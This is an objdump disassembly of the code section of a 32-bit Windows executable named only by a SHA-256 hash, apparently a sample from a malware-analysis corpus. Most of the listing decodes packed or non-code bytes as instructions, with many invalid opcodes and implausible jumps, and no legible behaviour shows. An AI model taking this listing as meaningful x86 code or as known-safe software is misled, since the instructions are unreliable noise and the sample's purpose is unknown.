
05101bc706fcd94b7af260d144f3b45eb182a66da9df1af2efe595e9f786cf30.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [eax],al
  401002:	add    BYTE PTR [eax],al
  401004:	call   0x8d6880
  401009:	add    BYTE PTR [eax],al
  40100b:	add    BYTE PTR [edx],al
  40100d:	add    BYTE PTR [eax],al
  40100f:	add    BYTE PTR [ebp+0x0],cl
  401012:	add    BYTE PTR [eax],al
  401014:	add    al,ah
  401016:	add    BYTE PTR [eax],al
  401018:	add    BYTE PTR [esi+0x554d0000],ah
  40101e:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  401024:	mov    esp,ebp
  401026:	or     ah,dh
  401028:	dec    ebp
  401029:	add    bh,al
  40102b:	add    BYTE PTR [eax],cl
  40102d:	add    BYTE PTR [eax],al
  40102f:	mov    DWORD PTR [eax],0x40f44545
  401035:	cmp    BYTE PTR [eax],al
  401037:	test   DWORD PTR [ebx-0x34070b64],ecx
  40103d:	(bad)  
  40103e:	enter  0x4d45,0xbc
  401042:	mov    edi,DWORD PTR [ebx]
  401044:	hlt    
  401045:	test   ebx,ecx
  401047:	pushf  
  401048:	enter  0x4df8,0x8b
  40104c:	mov    DWORD PTR [ebp-0x20],0x890208
  401053:	inc    ebp
  401054:	inc    ebp
  401055:	cld    
  401056:	xor    cl,BYTE PTR [ebx-0xb38b300]
  40105c:	or     BYTE PTR [ebx+0x0],dl
  40105f:	mov    ebx,0x8bd5900
  401064:	call   DWORD PTR [ecx-0x1]
  401067:	pop    es
  401068:	mov    ch,0x33
  40106a:	dec    ebx
  40106c:	(bad)  
  40106d:	mov    eax,0x72009fa4
  401072:	push   DWORD PTR [edx]
  401074:	or     BYTE PTR [eax],al
  401076:	jmp    0xff89:0x75c84d03
  40107d:	dec    ebp
  40107e:	loopne 0x401050
  401080:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  401086:	add    BYTE PTR [ebx],dh
  401088:	mov    ecx,ebx
  40108a:	hlt    
  40108b:	add    ecx,ebx
  40108d:	enter  0x899f,0x32
  401091:	dec    ebp
  401092:	add    ecx,eax
  401094:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  40109a:	or     DWORD PTR [ebx-0xb00b29c],0x0
  4010a1:	xor    ecx,ebx
  4010a3:	retf   
  4010a4:	enter  0x4d03,0xc8
  4010a8:	mov    DWORD PTR fs:[eax],ebx
  4010ab:	lea    eax,[eax]
  4010ad:	push   esp
  4010ae:	mov    edi,edi
  4010b0:	fs (bad) 
  4010b2:	(bad)  
  4010b3:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  4010b9:	push   0xffffffff
  4010bb:	and    bh,bh
  4010bd:	pop    ecx
  4010be:	inc    eax
  4010bf:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  4010c5:	push   0xffffff8b
  4010c7:	pop    ecx
  4010c8:	cld    
  4010c9:	dec    ebp
  4010ca:	lea    ecx,[ecx+0x45ff08ff]
  4010d0:	mov    BYTE PTR [edx+0x1],cl
  4010d3:	add    BYTE PTR [eax],al
  4010d5:	mov    DWORD PTR [ebp+0x8],0x58008d
  4010dc:	dec    DWORD PTR [ebp-0x77]
  4010df:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  4010e6:	cld    
  4010e7:	dec    ebp
  4010e8:	jne    0x40111d
  4010ea:	lea    eax,[ebx]
  4010ec:	push   eax
  4010ed:	mov    edi,edi
  4010ef:	or     BYTE PTR [ecx+0x54a845],cl
  4010f5:	add    al,ch
  4010f7:	(bad)  
  4010f8:	sub    ebp,esp
  4010fa:	add    BYTE PTR [eax],al
  4010fc:	rol    BYTE PTR [eax],0x84
  4010ff:	inc    ebp
  401100:	add    dh,BYTE PTR [esi+0x0]
  401103:	add    BYTE PTR [ebp-0x73],al
  401106:	mov    ebp,DWORD PTR [esp+edx*4]
  401109:	inc    DWORD PTR [eax]
  40110b:	lea    ecx,[ebx-0x30074f4]
  401111:	call   0x411c96
  401116:	add    BYTE PTR [ebp+0x0],cl
  401119:	jne    0x40115c
  40111b:	dec    DWORD PTR [ebx-0x76210314]
  401121:	dec    ebp
  401122:	add    DWORD PTR [ebp+0x0],esi
  401125:	(bad)  
  401126:	xchg   ebp,eax
  401127:	loopne 0x401128
  401129:	inc    eax
  40112a:	inc    DWORD PTR [eax]
  40112c:	mov    ecx,DWORD PTR [ebp-0x4]
  40112f:	xor    edx,DWORD PTR [edx+0x7201b8]
  401135:	add    BYTE PTR [edx],dl
  401137:	enter  0x4d90,0x0
  40113b:	mov    eax,DWORD PTR [eax]
  40113d:	hlt    
  40113e:	add    al,0xa5
  401140:	mov    al,0xff
  401142:	add    bh,bh
  401144:	add    BYTE PTR [ebx],dh
  401146:	inc    DWORD PTR [ebx]
  401148:	sbb    al,0x89
  40114a:	jne    0x401124
  40114c:	mov    esp,DWORD PTR [ecx+0x4500fc]
  401152:	mov    eax,DWORD PTR [ebp-0xff0048]
  401158:	mov    DWORD PTR [eax-0x70],0xec58ed89
  40115f:	inc    DWORD PTR [ebp-0x75]
  401162:	fisttp QWORD PTR [esi+ebp*8]
  401165:	test   DWORD PTR [esi-0x1],esp
  401168:	inc    ebp
  401169:	(bad)  
  40116a:	aas    
  40116b:	inc    ebp
  40116c:	(bad)  
  40116d:	lea    edi,[esp+eiz*2-0x1]
  401171:	push   DWORD PTR [edi]
  401173:	mov    DWORD PTR ds:0x8000c7a0,edi
  401179:	mov    ebp,esp
  40117b:	cld    
  40117c:	jmp    0xdfff:0xeeff458d
  401183:	mov    bh,al
  401185:	add    DWORD PTR [eax-0x13ba1500],ecx
  40118b:	inc    DWORD PTR [ebp-0x4]
  40118e:	xlat   BYTE PTR ds:[ebx]
  40118f:	lea    edi,[edi]
  401191:	inc    edi
  401193:	jmp    FWORD PTR [eax-0x78]
  401196:	inc    DWORD PTR [ecx]
  401198:	aaa    
  401199:	add    BYTE PTR ds:0x6c00c757,bh
  40119f:	test   edi,edi
  4011a1:	pandn  mm0,mm5
  4011a4:	aas    
  4011a5:	add    bh,al
  4011a7:	mov    esi,DWORD PTR [eax-0x4]
  4011aa:	inc    DWORD PTR [eax+0xdf01ee]
  4011b0:	(bad)  
  4011b1:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4011b5:	mov    esp,ebx
  4011b7:	xchg   esp,eax
  4011b8:	rol    DWORD PTR [eax],cl
  4011ba:	(bad)  
  4011bb:	mov    edi,DWORD PTR [eax+0x3]
  4011be:	(bad)  
  4011bf:	cmp    al,0xd7
  4011c1:	dec    ebp
  4011c2:	ror    DWORD PTR [ebx+0x2ad8e8],0x0
  4011c9:	lea    ecx,[ebx-0x7f0003b4]
  4011cf:	push   edx
  4011d0:	add    DWORD PTR [ebp+0x0],edx
  4011d3:	mov    esi,DWORD PTR [eax]
  4011d5:	mov    WORD PTR [edx+0x0],gs
  4011d8:	add    BYTE PTR [ebx-0x778afc7b],cl
  4011de:	mov    eax,DWORD PTR [eax]
  4011e0:	cld    
  4011e1:	push   0x7d
  4011e3:	dec    DWORD PTR [ebx+0xd88c]
  4011e9:	push   edx
  4011ea:	mov    edx,DWORD PTR [ecx-0x4]
  4011ed:	call   DWORD PTR [eax+0x7d01fc]
  4011f3:	mov    ecx,DWORD PTR [ecx+0x509000fc]
  4011f9:	add    DWORD PTR [esi+0x0],edx
  4011fc:	test   DWORD PTR [ebp+0x75],eax
  4011ff:	jmp    0x947d:0xc7fce28b
  401206:	mov    ebp,ebx
  401208:	fcom   st(7)
  40120a:	add    bh,al
  40120c:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  401212:	add    edi,edi
  401214:	add    bh,bh
  401216:	addr16 in eax,dx
  401218:	add    dh,dl
  40121a:	push   eax
  40121b:	inc    ebp
  40121c:	push   esi
  40121d:	fisttp WORD PTR [ebx+0x4dc7f43f]
  401223:	test   BYTE PTR [ebx],dh
  401225:	(bad)  
  401226:	add    eax,0x4572c8
  40122b:	jecxz  0x4011ee
  40122d:	rol    DWORD PTR [edi+eax*8-0x22ff73ff],cl
  401234:	inc    esi
  401235:	jle    0x401237
  401237:	test   edi,eax
  401239:	jmp    esp
  40123b:	inc    DWORD PTR [eax]
  40123d:	in     eax,dx
  40123e:	add    dh,dl
  401240:	jne    0x4011c7
  401242:	mov    edi,edi
  401244:	cld    
  401245:	inc    DWORD PTR [ebp-0x14]
  401248:	mov    ebp,edx
  40124a:	mov    ah,0x85
  40124c:	add    bh,bh
  40124e:	call   0x1163d52
  401253:	enter  0x858b,0xfc
  401257:	inc    DWORD PTR [eax+0xeb01ff]
  40125d:	in     al,dx
  40125e:	xor    BYTE PTR [ebp-0xff0020],al
  401264:	mov    ebx,ebp
  401266:	cld    
  401267:	jle    0x4011f2
  401269:	mov    eax,0x50000001
  40126e:	add    DWORD PTR [ebp+0x45],eax
  401271:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  401277:	dec    DWORD PTR [ebx-0x3fd80318]
  40127d:	add    BYTE PTR [ebp-0xbf0040],dl
  401283:	inc    ebp
  401284:	das    
  401285:	mov    eax,DWORD PTR [eax]
  401287:	cld    
  401288:	push   eax
  401289:	mov    al,0x45
  40128b:	add    DWORD PTR [ebx+0x459c00],ecx
  401291:	mov    edi,edi
  401293:	mov    eax,0xe80800ff
  401298:	inc    ebp
  401299:	sub    cl,BYTE PTR [ebx-0x47000400]
  40129f:	add    al,0x1
  4012a1:	rol    BYTE PTR [eax],0x1e
  4012a4:	jne    0x4012eb
  4012a6:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  4012ac:	inc    DWORD PTR [ecx]
  4012ae:	call   0x853cb3
  4012b3:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  4012b9:	call   0x403cbf
  4012be:	xor    bh,bh
  4012c0:	push   edi
  4012c1:	adc    BYTE PTR [ebx-0x747423bb],al
  4012c7:	loopne 0x4012a5
  4012c9:	ret    
  4012ca:	loopne 0x40126b
  4012cc:	xor    DWORD PTR [edx],0x31
  4012cf:	cmp    edi,edi
  4012d1:	bswap  esp
  4012d3:	rol    BYTE PTR gs:[eax],0x5
  4012d7:	jmp    0x12b1421
  4012dc:	mov    eax,DWORD PTR [ebp-0x4]
  4012df:	add    BYTE PTR [eax+0xff0100],bh
  4012e5:	cld    
  4012e6:	jne    0x401365
  4012e8:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  4012ee:	lds    eax,FWORD PTR [ecx]
  4012f0:	add    BYTE PTR [eax],al
  4012f2:	push   eax
  4012f3:	cs inc ebp
  4012f5:	add    BYTE PTR [ebx+0x459850],cl
  4012fb:	mov    edi,edi
  4012fd:	test   al,0xff
  4012ff:	add    BYTE PTR [eax],cl
  401301:	inc    DWORD PTR [ebp-0x18]
  401304:	jmp    DWORD PTR [esi]
  401306:	fadd   QWORD PTR [eax]
  401308:	jge    0x401357
  40130a:	adc    BYTE PTR [ebx+0x459cb9],cl
  401310:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  401316:	lahf   
  401317:	mov    eax,0x30132
  40131c:	lea    esi,[ebp+0x2c]
  40131f:	xor    edi,edi
  401321:	(bad)  
  401322:	call   0x13f3c8f
  401327:	call   0x1343db7
  40132c:	jne    0x4012b9
  40132e:	xor    edi,esp
  401330:	add    eax,DWORD PTR [eax+0xc018d]
  401336:	push   DWORD PTR [eax]
  401338:	call   0xc93c94
  40133d:	int3   
  40133e:	inc    DWORD PTR [ebp-0x14]
  401341:	mov    ecx,DWORD PTR [ebp-0x28]
  401344:	xor    eax,DWORD PTR [eax]
  401346:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  40134c:	(bad)  
  40134d:	xchg   ebp,eax
  40134e:	in     al,0xff
  401350:	add    bh,bh
  401352:	add    BYTE PTR [eax*2+0x8508b00],al
  401359:	inc    ebp
  40135a:	ret    
  40135b:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff61]
  401362:	mov    edi,edi
  401364:	or     BYTE PTR [eax],cl
  401366:	inc    ebp
  401367:	test   DWORD PTR gs:[eax],eax
  40136a:	je     0x4013b1
  40136c:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  401372:	xor    edx,DWORD PTR [eax-0x73]
  401375:	push   ebp
  401376:	or     BYTE PTR [ebp+0x21007572],al
  40137c:	inc    ebp
  40137d:	in     al,dx
  40137e:	mov    ebp,DWORD PTR [eax]
  401380:	mov    esp,0x618bc345
  401385:	fmul   st,st(5)
  401387:	add    BYTE PTR [ebx],ch
  401389:	mov    eax,DWORD PTR [ebx]
  40138b:	cld    
  40138c:	loopne 0x40134e
  40138e:	inc    ebp
  40138f:	push   ebp
  401390:	cmp    ebp,eax
  401392:	movaps XMMWORD PTR [eax-0x74740100],xmm4
  401399:	cld    
  40139a:	fadd   DWORD PTR [eax+0x3b014d]
  4013a0:	jne    0x4013d2
  4013a2:	push   0xf8898557
  4013a7:	in     al,dx
  4013a8:	jne    0x4013ef
  4013aa:	lea    eax,[ebx+0x72e8dcc8]
  4013b0:	xor    DWORD PTR [ebx+0x7545bc00],ecx
  4013b6:	jmp    0x4013eb
  4013b8:	mov    edi,DWORD PTR [edi+0x4572bc]
  4013be:	xor    eax,edi
  4013c0:	adc    DWORD PTR [ebp-0xcd0061],0x8b9031
  4013ca:	rcl    BYTE PTR [eax-0x40],1
  4013cd:	inc    ebp
  4013ce:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  4013d6:	inc    ebp
  4013d7:	xchg   ebp,eax
  4013d8:	ud0    ebp,DWORD PTR [ebx]
  4013db:	inc    DWORD PTR [eax]
  4013dd:	jp     0x401455
  4013df:	add    BYTE PTR [edx+0x1f558050],cl
  4013e5:	mov    ecx,DWORD PTR [esp+esi*8]
  4013e8:	inc    eax
  4013e9:	retf   
  4013ea:	inc    ebp
  4013eb:	iret   
  4013ec:	jb     0x4013b6
  4013ee:	mov    eax,DWORD PTR [edi]
  4013f0:	enter  0x4545,0x1
  4013f4:	cmp    BYTE PTR [eax],al
  4013f6:	pushf  
  4013f7:	mov    ecx,DWORD PTR [ecx+0x3b4df0bc]
  4013fd:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  401404:	dec    ebp
  401405:	add    BYTE PTR [ebx],dh
  401407:	inc    ebp
  401408:	mov    DWORD PTR [ebx-0x3f601b4c],ecx
  40140e:	xor    dl,BYTE PTR [edx]
  401410:	add    eax,DWORD PTR [ebp-0x77]
  401413:	mov    eax,esp
  401415:	fmul   DWORD PTR [ebp-0x3d]
  401418:	xor    eax,DWORD PTR [ebx+eax*1+0x832899f]
  40141f:	mov    DWORD PTR [ebp-0x28],eax
  401422:	fadd   DWORD PTR [ebp-0x64]
  401425:	xor    eax,edi
  401427:	mov    ecx,0xff858db0
  40142c:	clc    
  40142d:	enter  0x4d45,0x3d
  401431:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  401438:	test   esi,edi
  40143a:	clc    
  40143b:	inc    DWORD PTR [ebp+0x45]
  40143e:	aas    
  40143f:	mov    ebx,DWORD PTR [eax+ecx*1+0x16a8c8c7]
  401446:	test   DWORD PTR [eax],edi
  401448:	clc    
  401449:	pushf  
  40144a:	inc    ebp
  40144b:	push   DWORD PTR [ecx]
  40144d:	cld    
  40144e:	pushf  
  40144f:	inc    ebp
  401450:	mov    edx,DWORD PTR [eax-0x28]
  401453:	ins    DWORD PTR es:[edi],dx
  401454:	push   ebp
  401455:	add    BYTE PTR [ebx],dh
  401457:	mov    DWORD PTR [ebx],eax
  401459:	sar    BYTE PTR [ebx],1
  40145b:	adc    BYTE PTR [edi],cl
  40145d:	dec    ebp
  40145e:	adc    al,0x8b
  401460:	add    al,dl
  401462:	jmp    0x1011632
  401467:	jb     0x4014b6
  401469:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  40146f:	xor    ecx,DWORD PTR [ebp+0x3b]
  401472:	xor    ecx,DWORD PTR [edi]
  401474:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  401478:	(bad)  
  40147a:	clc    
  40147b:	enter  0x8400,0x8b
  40147f:	pop    es
  401480:	mov    al,0x0
  401482:	push   ebp
  401483:	push   cs
  401484:	xor    ecx,eax
  401486:	xor    esp,ecx
  401488:	add    ebp,DWORD PTR [eax]
  40148a:	add    esi,DWORD PTR [eax]
  40148c:	(bad)  
  40148e:	retf   0x55c8
  401491:	repnz mov eax,DWORD PTR [ebp-0x10]
  401495:	(bad)  
  401496:	cli    
  401497:	fdivr  st,st(1)
  401499:	test   DWORD PTR [eax+edi*8],ecx
  40149c:	dec    ebp
  40149d:	inc    ebp
  40149e:	xor    edi,DWORD PTR [eax-0x7167afd]
  4014a4:	add    BYTE PTR [ebp+0x0],al
  4014a7:	mov    ecx,DWORD PTR [ebp-0x28]
  4014aa:	mov    ecx,ebx
  4014ac:	clc    
  4014ad:	jne    0x40147a
  4014af:	mov    esi,0xd672d3
  4014b4:	into   
  4014b5:	into   
  4014b6:	scas   eax,DWORD PTR es:[edi]
  4014b7:	dec    ebp
  4014b8:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  4014be:	sub    ecx,esi
  4014c0:	cmp    ecx,DWORD PTR [ebp+0x77]
  4014c3:	(bad)  
  4014c4:	mov    edi,eax
  4014c6:	mov    al,0x85
  4014c8:	mov    eax,edi
  4014ca:	add    BYTE PTR [ebp-0x75],al
  4014cd:	cmp    ah,BYTE PTR [esp+ebx*4-0x47cc38ab]
  4014d4:	xor    eax,DWORD PTR [ebp+0x4503f803]
  4014da:	(bad)  
  4014dc:	retf   0x559c
  4014df:	(bad)  
  4014e0:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  4014e7:	inc    ebp
  4014e8:	add    eax,0xeb9c4d3e
  4014ed:	(bad)  
  4014ee:	mov    ecx,esp
  4014f0:	lods   al,BYTE PTR ds:[esi]
  4014f1:	test   DWORD PTR [ebp-0x8],edx
  4014f4:	xor    ecx,DWORD PTR [ebp+0x33]
  4014f7:	mov    eax,DWORD PTR [ebx]
  4014f9:	lock add ecx,ebx
  4014fc:	bswap  esi
  4014fe:	retf   0x55d1
  401501:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  401507:	jmp    0x401502
  401509:	add    BYTE PTR ds:0xebc44d8b,al
  40150f:	push   ebp
  401510:	mov    ebp,DWORD PTR [ebx]
  401512:	test   al,0x8b
  401514:	push   ebp
  401515:	clc    
  401516:	xor    ecx,ebx
  401518:	xor    ecx,esi
  40151a:	add    edx,ecx
  40151c:	add    eax,DWORD PTR [edx+0xca010f]
  401522:	push   ebp
  401523:	dec    ebp
  401524:	mov    ecx,DWORD PTR [ebx-0x34050710]
  40152a:	stc    
  40152b:	rol    DWORD PTR ds:0xebce4dd6,cl
  401531:	scas   eax,DWORD PTR es:[edi]
  401532:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  401538:	xor    ebp,DWORD PTR [ebx]
  40153a:	xor    edi,DWORD PTR [ebx]
  40153c:	add    esi,DWORD PTR [edi+0x3]
  40153f:	mov    ecx,DWORD PTR [edi]
  401541:	clc    
  401542:	retf   0x55cb
  401545:	into   
  401546:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  40154d:	mov    eax,0x3376554d
  401552:	mov    esi,DWORD PTR [ebx]
  401554:	int3   
  401555:	add    edx,DWORD PTR [ebp+0x3]
  401558:	xor    ecx,DWORD PTR [edi]
  40155a:	xor    ecx,edx
  40155c:	add    edx,DWORD PTR [ebp+0x3]
  40155f:	mov    ecx,DWORD PTR [edi]
  401561:	lock retf 0x4dfa
  401565:	stc    
  401566:	mov    ecx,DWORD PTR [eax]
  401568:	or     BYTE PTR [ebp+0x4d],cl
  40156b:	jmp    0x10415fb
  401570:	dec    ebp
  401571:	dec    ebp
  401572:	(bad)  
  401573:	mov    ebx,esp
  401575:	clc    
  401576:	test   ebx,ecx
  401578:	clc    
  401579:	ror    DWORD PTR [ebp-0x2a],cl
  40157c:	mov    esi,ecx
  40157e:	call   0x3acb5b32
  401583:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  40158a:	retf   
  40158b:	ja     0x40155b
  40158d:	mov    ebp,DWORD PTR [eax-0x48]
  401590:	dec    ebp
  401591:	xor    ecx,DWORD PTR [di+0x3]
  401595:	mov    esp,esp
  401597:	clc    
  401598:	push   ebp
  401599:	retf   
  40159a:	mov    dl,bl
  40159c:	adc    esi,edx
  40159e:	jb     0x40156e
  4015a0:	add    BYTE PTR [edi-0x3b7474b3],ch
  4015a6:	call   0x4d6be128
  4015ab:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  4015b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4015b2:	lahf   
  4015b3:	inc    ebp
  4015b4:	xor    cl,BYTE PTR [ebp-0x78]
  4015b7:	mov    edx,edi
  4015b9:	clc    
  4015ba:	dec    ebp
  4015bb:	retf   
  4015bc:	mov    edx,ebx
  4015be:	call   0x560ee999
  4015c3:	scas   eax,DWORD PTR es:[edi]
  4015c4:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  4015ca:	lahf   
  4015cb:	sub    esi,DWORD PTR [edx]
  4015cd:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  4015d3:	lods   al,BYTE PTR ds:[esi]
  4015d4:	xor    esp,DWORD PTR [ebx]
  4015d6:	add    ecx,DWORD PTR [ebp-0x1c]
  4015d9:	mov    edi,DWORD PTR [ebp-0x8]
  4015dc:	mov    bl,cl
  4015de:	cmp    dl,bl
  4015e0:	jb     0x4015b0
  4015e2:	add    dh,dl
  4015e4:	dec    ebp
  4015e5:	scas   eax,DWORD PTR es:[edi]
  4015e6:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  4015ec:	shr    DWORD PTR [ebx],cl
  4015ee:	into   
  4015ef:	cmp    edx,esi
  4015f1:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  4015f7:	dec    ebp
  4015f8:	dec    ebp
  4015f9:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  4015ff:	retf   
  401600:	xor    edx,esi
  401602:	add    ecx,esi
  401604:	imul   ecx,edx
  401607:	mov    DWORD PTR [ebp+0x8],edx
  40160a:	xor    ecx,DWORD PTR [ebp+0x2b]
  40160d:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  401613:	add    esi,DWORD PTR [ebx]
  401615:	mov    ah,0x3
  401617:	inc    ebp
  401618:	(bad)  
  40161b:	pushf  
  40161c:	jge    0x4015a7
  40161e:	xor    ebx,eax
  401620:	sub    eax,DWORD PTR [ebp-0x73]
  401623:	(bad)  
  401624:	cmp    al,al
  401626:	jb     0x4015ad
  401628:	add    al,bh
  40162a:	ror    DWORD PTR [ebp-0x7a],1
  40162d:	xor    edi,edi
  40162f:	add    edi,edi
  401631:	jmp    0x401680
  401633:	mov    ecx,DWORD PTR [ebx-0x34341324]
  401639:	dec    ebp
  40163a:	into   
  40163b:	mov    ebp,DWORD PTR [edi-0x23737428]
  401641:	lahf   
  401642:	shl    DWORD PTR [edx],cl
  401644:	retf   0x5588
  401647:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40164d:	add    eax,DWORD PTR [eax]
  40164f:	in     al,0x4d
  401651:	push   ebp
  401652:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  401658:	popa   
  401659:	add    ch,cl
  40165b:	dec    ebp
  40165c:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  401662:	dec    ebp
  401663:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  401669:	jge    0x401639
  40166b:	mov    BYTE PTR [edi+0xf723b3a],ch
  401671:	add    cl,dh
  401673:	dec    ebp
  401674:	dec    DWORD PTR [ebx-0x2c032375]
  40167a:	adc    BYTE PTR [ebp+0x1],0x8b
  40167e:	add    al,bl
  401680:	jge    0x40160e
  401682:	push   0xffffff9f
  401684:	push   0x8b3032
  401689:	shl    BYTE PTR [ebp+0x55],0x6a
  40168d:	xor    edi,edi
  40168f:	xor    edx,DWORD PTR [ebx+eax*1]
  401692:	inc    ebp
  401693:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  401699:	dec    ebp
  40169a:	or     BYTE PTR [ecx+0x4dc8e483],cl
  4016a0:	jbe    0x40162d
  4016a2:	mov    ebp,esp
  4016a4:	ror    bl,1
  4016a6:	enter  0x14ce,0xaf
  4016aa:	dec    DWORD PTR [ebx-0x2cef17f8]
  4016b0:	push   ebp
  4016b1:	retf   0x5540
  4016b4:	push   ebp
  4016b5:	mov    esi,DWORD PTR [edx-0x1c]
  4016b8:	mov    edx,ebx
  4016ba:	cld    
  4016bb:	(bad)  
  4016bc:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  4016c3:	sti    
  4016c4:	add    dh,cl
  4016c6:	push   0xffffff94
  4016c8:	call   FWORD PTR [edi+0x3b5032d0]
  4016ce:	mov    ecx,DWORD PTR [edi]
  4016d0:	int3   
  4016d1:	pop    esi
  4016d2:	inc    ebp
  4016d3:	dec    DWORD PTR [ecx+0x45e8c88b]
  4016d9:	push   ebp
  4016da:	xor    esi,DWORD PTR [ebx]
  4016dc:	mov    DWORD PTR [ebx],0xcace0f9c
  4016e2:	aas    
  4016e3:	push   ebp
  4016e4:	inc    ebp
  4016e5:	xor    eax,esi
  4016e7:	add    eax,esi
  4016e9:	mov    eax,DWORD PTR [ebx]
  4016eb:	(bad)  
  4016ec:	jmp    0x40167a
  4016ee:	mov    bl,BYTE PTR [edi-0x7674cdfb]
  4016f4:	rol    ah,1
  4016f6:	mov    esi,0xf133104d
  4016fb:	mov    edx,0xff348d80
  401700:	mov    dh,0xd1
  401702:	cmp    edx,DWORD PTR [ebp+0xf]
  401705:	mov    eax,DWORD PTR [edx-0x20]
  401708:	add    BYTE PTR [ebp-0x75],bh
  40170b:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  401712:	lahf   
  401713:	retf   0x8632
  401716:	cmp    ebp,0x8
  401719:	call   ebx
  40171b:	inc    ebp
  40171c:	inc    ebp
  40171d:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  401723:	mov    edi,DWORD PTR [eax]
  401725:	enter  0x49c,0xc7
  401729:	add    al,al
  40172b:	add    bl,al
  40172d:	(bad)  
  40172e:	clc    
  40172f:	enter  0x45,0x38
  401733:	push   eax
  401734:	pushf  
  401735:	mov    edi,eax
  401737:	int3   
  401738:	or     al,al
  40173a:	test   DWORD PTR [edi],edi
  40173c:	clc    
  40173d:	gs inc ebp
  40173f:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  401745:	push   ss
  401746:	xor    ecx,DWORD PTR [ebp+0x3]
  401749:	sub    edx,DWORD PTR [ecx-0x76]
  40174c:	dec    ebp
  40174d:	add    DWORD PTR [ebx+0x88d845],ecx
  401753:	mov    esi,DWORD PTR [ebx]
  401755:	or     BYTE PTR [ebx],al
  401757:	cmp    edx,DWORD PTR [ecx-0x38]
  40175a:	dec    ebp
  40175b:	out    dx,eax
  40175c:	xor    eax,DWORD PTR [ebp+0x3]
  40175f:	mov    edx,DWORD PTR [ecx-0x28]
  401762:	dec    ebp
  401763:	add    BYTE PTR [ebx],dh
  401765:	push   0x518003
  40176a:	push   eax
  40176b:	add    BYTE PTR [ebx-0x300748b],cl
  401771:	sbb    BYTE PTR [ebp+0x45],cl
  401774:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  40177a:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  401780:	dec    ebp
  401781:	inc    ebp
  401782:	xor    eax,esi
  401784:	add    eax,esi
  401786:	push   ecx
  401787:	(bad)  
  401788:	dec    ebp
  401789:	mov    al,ds:0x35e03dff
  40178e:	retf   
  40178f:	(bad)  
  401790:	into   
  401791:	sub    bh,bh
  401793:	dec    esp
  401794:	adc    al,0x9c
  401796:	inc    ebp
  401797:	push   ebp
  401798:	test   DWORD PTR [edi],ecx
  40179a:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab5ff80]
  4017a1:	jmp    0xc9b926b5
  4017a6:	add    cl,dl
  4017a8:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  4017b2:	cmp    cl,BYTE PTR [ebp+0x728b089c]
  4017b8:	rol    BYTE PTR [eax],0x59
  4017bb:	clc    
  4017bc:	popa   
  4017bd:	jb     0x4017c6
  4017bf:	mov    eax,DWORD PTR [ebp-0x30]
  4017c2:	xor    al,0x40
  4017c4:	sub    al,0xc7
  4017c6:	mov    ah,ch
  4017c8:	add    DWORD PTR [ebp+0x4534f845],eax
  4017ce:	sub    al,0x89
  4017d0:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  4017d7:	mov    ch,0xff
  4017d9:	clc    
  4017da:	add    DWORD PTR [ebp+0x60],0x3c
  4017de:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  4017e5:	inc    ebp
  4017e6:	dec    DWORD PTR [ebx-0x341ff701]
  4017ec:	test   esi,ecx
  4017ee:	dec    DWORD PTR [ebx-0x7f8a3301]
  4017f4:	push   eax
  4017f5:	add    DWORD PTR [ebp+0x0],eax
  4017f8:	dec    ebx
  4017fa:	or     al,0xce
  4017fc:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  401803:	into   
  401804:	add    BYTE PTR [ebx-0x34ff1400],cl
  40180a:	mov    esi,ecx
  40180c:	sar    bh,0x45
  40180f:	adc    al,0x8b
  401811:	clc    
  401812:	fadd   DWORD PTR [ebp+0x0]
  401815:	mov    ebp,DWORD PTR [edx+0x8]
  401818:	push   edi
  401819:	adc    BYTE PTR [eax+0x1],0x83
  40181d:	add    al,al
  40181f:	retf   
  401820:	mov    ecx,esi
  401822:	cld    
  401823:	mov    eax,DWORD PTR [eax+0xcb01cc]
  401829:	into   
